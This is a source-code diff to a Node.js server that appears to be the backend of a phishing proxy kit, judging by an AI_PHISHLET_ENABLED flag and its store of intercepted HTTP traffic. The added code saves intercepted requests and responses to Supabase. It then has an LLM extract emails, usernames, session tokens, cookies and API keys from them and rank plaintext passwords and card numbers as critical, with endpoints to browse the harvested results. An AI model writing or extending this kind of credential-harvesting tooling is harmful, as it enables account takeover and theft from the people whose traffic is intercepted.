@@ -4,6 +4,16 @@
 import http from "node:http";
 import https from "node:https";
 import { WebSocketServer } from "ws";
+import {
+  persistIntercept,
+  persistAnalysis,
+  fetchIntercepts,
+  fetchAnalysis,
+  fetchOrganizedIntercepts,
+  fetchAnalysisStats,
+  deleteIntercept,
+  clearAllIntercepts,
+} from "./supabase-client.js";
 
 const PORT = parseInt(process.env.PORT || "8787", 10);
 const API_KEY = process.env.API_KEY || "";
@@ -15,6 +25,7 @@ const TOOLKIT_SECRET_KEY = process.env.TOOLKIT_SECRET_KEY || "";
 const AI_ENABLED = !!TOOLKIT_URL && !!TOOLKIT_SECRET_KEY;
 const AI_PHISHLET_ENABLED = AI_ENABLED;
 const AI_BUILD_ENABLED = AI_ENABLED;
+const AI_CATEGORIZE_ENABLED = AI_ENABLED;
 
 // ── In-memory storage ───────────────────────────────────────────────────────
 let nextId = 1;
@@ -516,6 +527,130 @@ function httpPost(url, body) {
   });
 }
 
+// ── AI Intercept Auto-Categorization (Kimi K2.7) ────────────────────────────
+
+/**
+ * Auto-categorize an intercepted HTTP request/response using Kimi K2.7.
+ * Returns structured analysis: category, sensitivity, credentials, tags, etc.
+ */
+async function autoCategorizeIntercept(intercept) {
+  if (!AI_CATEGORIZE_ENABLED) return null;
+
+  const systemPrompt = [
+    "You are an HTTP traffic analysis agent. You categorize intercepted HTTP requests/responses.",
+    "You extract security-relevant details and flag sensitive data exposure.",
+    "",
+    "## Categories (pick one):",
+    "- auth: login, registration, OAuth, token refresh, session management",
+    "- api: REST/GraphQL/JSON API calls",
+    "- static: CSS, JS, images, fonts, assets",
+    "- document: HTML pages, documents",
+    "- redirect: 3xx redirects",
+    "- error: 4xx/5xx error responses",
+    "- websocket: WebSocket upgrade/communication",
+    "- cdn: CDN/cached content delivery",
+    "- tracking: analytics, beacons, pixels, telemetry",
+    "- other: none of the above",
+    "",
+    "## Sensitivity levels:",
+    "- critical: plaintext passwords, credit cards, SSNs, private keys in response",
+    "- high: session tokens, auth cookies, API keys, OAuth tokens in response",
+    "- medium: PII (email, phone, address), internal hostnames, CSRF tokens",
+    "- low: non-sensitive cookies, user IDs, public metadata",
+    "- none: no sensitive data detected",
+    "",
+    "## Tags (pick all that apply):",
+    "sensitive, authenticated, cached, redirect, error, json, xml, form, multipart,",
+    "cors, rate-limited, compressed, chunked, websocket, graphql, rest, soap",
+    "",
+    "## Response format (JSON only, no markdown):",
+    "{",
+    "  \"category\": \"<category>\",",
+    "  \"sensitivityLevel\": \"<level>\",",
+    "  \"summary\": \"<one-line human-readable summary of what this request does>\",",
+    "  \"extractedCredentials\": { \"emails\": [], \"usernames\": [], \"tokens\": [], \"cookies\": [], \"apiKeys\": [] },",
+    "  \"tags\": [\"tag1\", \"tag2\"],",
+    "  \"securityFindings\": [",
+    "    { \"finding\": \"<description>\", \"severity\": \"critical|high|medium|low|info\", \"detail\": \"<specific detail>\" }",
+    "  ]",
+    "}",
+  ].join("\n");
+
+  // Build a concise representation of the intercept
+  const reqSummary = `${intercept.method} ${intercept.host}${intercept.path}`;
+  const respSummary = `Status: ${intercept.respStatus}`;
+  const reqHeadersBrief = (intercept.reqHeaders || "").slice(0, 2000);
+  const respHeadersBrief = (intercept.respHeaders || "").slice(0, 2000);
+  const reqBodyBrief = (intercept.reqBody || "").slice(0, 3000);
+  const respBodyBrief = (intercept.respBody || "").slice(0, 3000);
+
+  const userMessage = [
+    `Analyze this intercepted HTTP traffic:`,
+    ``,
+    `## Request`,
+    `${reqSummary}`,
+    `Headers:`,
+    "```",
+    reqHeadersBrief || "(none)",
+    "```",
+    `Body:`,
+    "```",
+    reqBodyBrief || "(none)",
+    "```",
+    ``,
+    `## Response`,
+    `${respSummary}`,
+    `Headers:`,
+    "```",
+    respHeadersBrief || "(none)",
+    "```",
+    `Body:`,
+    "```",
+    respBodyBrief || "(none)",
+    "```",
+  ].join("\n");
+
+  try {
+    const body = JSON.stringify({
+      model: "moonshotai/kimi-k2.7-code-highspeed",
+      messages: [
+        { role: "system", content: systemPrompt },
+        { role: "user", content: userMessage },
+      ],
+      max_tokens: 2048,
+      temperature: 0.1,
+    });
+
+    const url = new URL("/v2/vercel/v1/chat/completions", TOOLKIT_URL);
+    const result = await httpPost(url, body);
+
+    if (!result?.choices?.[0]?.message?.content) {
+      console.error("[ai-categorize] empty AI response");
+      return null;
+    }
+
+    let raw = result.choices[0].message.content.trim();
+    // Strip markdown fences if present
+    raw = raw.replace(/^```(?:json)?\s*\n?/i, "").replace(/\n?```\s*$/, "");
+
+    const parsed = JSON.parse(raw);
+
+    return {
+      category: parsed.category || "uncategorized",
+      sensitivityLevel: parsed.sensitivityLevel || "none",
+      summary: parsed.summary || "",
+      extractedCredentials: parsed.extractedCredentials || {},
+      tags: Array.isArray(parsed.tags) ? parsed.tags : [],
+      securityFindings: Array.isArray(parsed.securityFindings) ? parsed.securityFindings : [],
+      modelUsed: "moonshotai/kimi-k2.7-code-highspeed",
+      tokensUsed: result.usage?.total_tokens || 0,
+    };
+  } catch (err) {
+    console.error(`[ai-categorize] failed: ${err.message}`);
+    return null;
+  }
+}
+
 // ── Auth ────────────────────────────────────────────────────────────────────
 function checkAuth(req) {
   if (!API_KEY) return null; // auth is opt-out when no key configured
@@ -968,6 +1103,11 @@ async function handleRequest(req, res) {
     if (method === "GET") {
       const authErr = checkAuth(req);
       if (authErr) return json(res, authErr.status, authErr.body, cors);
+      // Try Supabase first, fall back to in-memory
+      const { data: dbData } = await fetchIntercepts({ limit: 200 });
+      if (dbData && dbData.length > 0) {
+        return json(res, 200, { success: true, data: dbData, count: dbData.length, source: "supabase" }, cors);
+      }
       return json(
         res,
         200,
@@ -975,14 +1115,135 @@ async function handleRequest(req, res) {
         cors,
       );
     }
+    if (method === "POST") {
+      // Save intercept to both in-memory and Supabase, then auto-categorize with AI
+      const body = await readBody(req);
+      if (!body || !body.path) {
+        return json(res, 400, { success: false, error: "intercept data is required" }, cors);
+      }
+      const capture = {
+        id: nextId++,
+        ts: body.ts || Date.now(),
+        slug: body.slug || "",
+        method: body.method || "GET",
+        path: body.path || "/",
+        reqHeaders: body.reqHeaders || "",
+        reqBody: body.reqBody || "",
+        respStatus: body.respStatus || 200,
+        respHeaders: body.respHeaders || "",
+        respBody: body.respBody || "",
+        host: body.host || "",
+      };
+      intercepts.unshift(capture);
+      if (intercepts.length > 500) intercepts.length = 500;
+
+      // Persist to Supabase in background (don't block response)
+      const supabaseRow = await persistIntercept(capture);
+
+      // Trigger AI auto-categorization in background
+      if (supabaseRow && AI_CATEGORIZE_ENABLED) {
+        autoCategorizeIntercept(capture).then(async (analysis) => {
+          if (analysis) {
+            const saved = await persistAnalysis(supabaseRow.id, analysis);
+            if (saved) {
+              broadcast("intercepts:analyzed", { interceptId: supabaseRow.id, analysis });
+            }
+          }
+        }).catch((err) => console.error("[ai-categorize] background job failed:", err.message));
+      }
+
+      broadcast("intercepts:changed");
+      return json(res, 201, {
+        success: true,
+        data: capture,
+        supabaseId: supabaseRow?.id || null,
+      }, cors);
+    }
     if (method === "DELETE") {
       const authErr = checkAuth(req);
       if (authErr) return json(res, authErr.status, authErr.body, cors);
       intercepts.length = 0;
+      // Also clear Supabase
+      clearAllIntercepts().catch((err) => console.error("[supabase] clear failed:", err.message));
       broadcast("intercepts:changed");
       return json(res, 200, { success: true, data: null }, cors);
     }
     return json(res, 405, { success: false, error: "method not allowed" }, cors);
+  }
+
+  // ── Supabase-backed AI-organized intercepts ──
+  // GET /api/intercepts/analyzed — fetch intercepts with AI analysis
+  if (pathname === "/api/intercepts/analyzed" && method === "GET") {
+    const authErr = checkAuth(req);
+    if (authErr) return json(res, authErr.status, authErr.body, cors);
+    const limit = parseInt(url.searchParams.get("limit") || "50", 10);
+    const offset = parseInt(url.searchParams.get("offset") || "0", 10);
+    const category = url.searchParams.get("category") || undefined;
+    const sensitivity = url.searchParams.get("sensitivity") || undefined;
+    const tag = url.searchParams.get("tag") || undefined;
+
+    const { data } = await fetchOrganizedIntercepts({ category, sensitivityLevel: sensitivity, tag, limit, offset });
+    return json(res, 200, { success: true, data, count: data?.length || 0, source: "supabase" }, cors);
+  }
+
+  // GET /api/intercepts/stats — AI analysis aggregate statistics
+  if (pathname === "/api/intercepts/stats" && method === "GET") {
+    const authErr = checkAuth(req);
+    if (authErr) return json(res, authErr.status, authErr.body, cors);
+    const stats = await fetchAnalysisStats();
+    return json(res, 200, { success: true, data: stats, source: "supabase" }, cors);
+  }
+
+  // POST /api/intercepts/:id/analyze — trigger AI analysis for a specific intercept
+  const analyzeMatch = pathname.match(/^\/api\/intercepts\/(\d+)\/analyze$/);
+  if (analyzeMatch && method === "POST") {
+    const authErr = checkAuth(req);
+    if (authErr) return json(res, authErr.status, authErr.body, cors);
+    const interceptId = parseInt(analyzeMatch[1], 10);
+
+    // Find the intercept (in-memory first, then Supabase)
+    let capture = intercepts.find((ic) => ic.id === interceptId);
+    if (!capture) {
+      const { data: dbData } = await fetchIntercepts({ limit: 1 });
+      const dbCapture = dbData?.find((r) => r.id === interceptId);
+      if (dbCapture) {
+        capture = {
+          id: dbCapture.id,
+          ts: dbCapture.raw_timestamp,
+          slug: dbCapture.slug,
+          method: dbCapture.method,
+          path: dbCapture.path,
+          reqHeaders: dbCapture.req_headers || "",
+          reqBody: dbCapture.req_body || "",
+          respStatus: dbCapture.resp_status,
+          respHeaders: dbCapture.resp_headers || "",
+          respBody: dbCapture.resp_body || "",
+          host: dbCapture.host,
+        };
+      }
+    }
+
+    if (!capture) {
+      return json(res, 404, { success: false, error: "intercept not found" }, cors);
+    }
+
+    if (!AI_CATEGORIZE_ENABLED) {
+      return json(res, 503, { success: false, error: "AI categorization is not configured" }, cors);
+    }
+
+    const analysis = await autoCategorizeIntercept(capture);
+    if (!analysis) {
+      return json(res, 500, { success: false, error: "AI analysis failed" }, cors);
+    }
+
+    // Persist analysis to Supabase
+    const saved = await persistAnalysis(interceptId, analysis);
+    broadcast("intercepts:analyzed", { interceptId, analysis });
+
+    return json(res, 200, {
+      success: true,
+      data: { interceptId, analysis: saved || analysis },
+    }, cors);
   }
 
   // HAR export — returns raw HAR 1.2 JSON (not wrapped in API envelope)
